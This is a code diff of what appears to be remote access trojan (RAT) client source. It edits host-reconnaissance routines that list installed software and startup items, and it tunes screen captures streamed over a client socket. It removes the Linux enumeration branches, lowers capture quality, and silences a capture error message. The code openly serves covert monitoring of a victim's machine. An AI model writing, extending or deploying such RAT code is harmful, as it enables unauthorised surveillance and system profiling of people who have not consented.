@@ -1206,33 +1206,6 @@ class AdvancedMonitoring:
                     if len(software) >= limit:
                         software = software[:limit]
                         break
-                        
-            else:  # Unix/Linux - use dpkg or rpm
-                if os.path.exists("/usr/bin/dpkg"):  # Debian/Ubuntu
-                    output = subprocess.check_output(["/usr/bin/dpkg", "-l"]).decode('utf-8')
-                    for line in output.split('\n'):
-                        if line.startswith('ii'):
-                            parts = line.split()
-                            if len(parts) >= 3:
-                                software.append({
-                                    'name': parts[1],
-                                    'version': parts[2],
-                                    'architecture': parts[3] if len(parts) > 3 else "Unknown"
-                                })
-                                if len(software) >= limit:
-                                    break
-                                
-                elif os.path.exists("/usr/bin/rpm"):  # Red Hat/Fedora/CentOS
-                    output = subprocess.check_output(["/usr/bin/rpm", "-qa"]).decode('utf-8')
-                    for line in output.split('\n'):
-                        if line.strip():
-                            software.append({
-                                'name': line.strip(),
-                                'version': "N/A",
-                                'architecture': "N/A"
-                            })
-                            if len(software) >= limit:
-                                break
                 
         except Exception as e:
             print(f"[!] Error getting installed software: {e}")
@@ -1311,31 +1284,6 @@ class AdvancedMonitoring:
                                 'source': folder,
                                 'name': item,
                                 'command': item_path
-                            })
-                            
-            else:  # Unix/Linux
-                # Check common startup locations
-                startup_files = [
-                    '/etc/rc.local',
-                    '/etc/init.d',
-                    '/etc/systemd/system',
-                    os.path.expanduser('~/.config/autostart')
-                ]
-                
-                for file_path in startup_files:
-                    if os.path.exists(file_path):
-                        if os.path.isdir(file_path):
-                            for item in os.listdir(file_path):
-                                startup_items.append({
-                                    'source': file_path,
-                                    'name': item,
-                                    'command': os.path.join(file_path, item)
-                                })
-                        else:
-                            startup_items.append({
-                                'source': os.path.dirname(file_path),
-                                'name': os.path.basename(file_path),
-                                'command': file_path
                             })
                 
         except Exception as e:
@@ -2671,11 +2619,11 @@ class NetworkAnalyzer:
 class EnhancedAdaptiveScreenCapture:
     """Handles advanced adaptive quality and performance for screen captures"""
     
-    def __init__(self, client_socket, initial_quality=70):
+    def __init__(self, client_socket, initial_quality=60):
         self.client_socket = client_socket
         self.quality = initial_quality
         self.min_quality = 15
-        self.max_quality = 95
+        self.max_quality = 85
         
         # Adaptive bitrate control with multi-level targets
         self.bitrate_targets = {
@@ -3451,7 +3399,7 @@ class RATClient:
                     
                     return img
                 except Exception as e:
-                    print(f"[!] Fast screen capture failed: {e}")
+                    # print(f"[!] Fast screen capture failed: {e}")
                     return None
             
             # Main capture loop
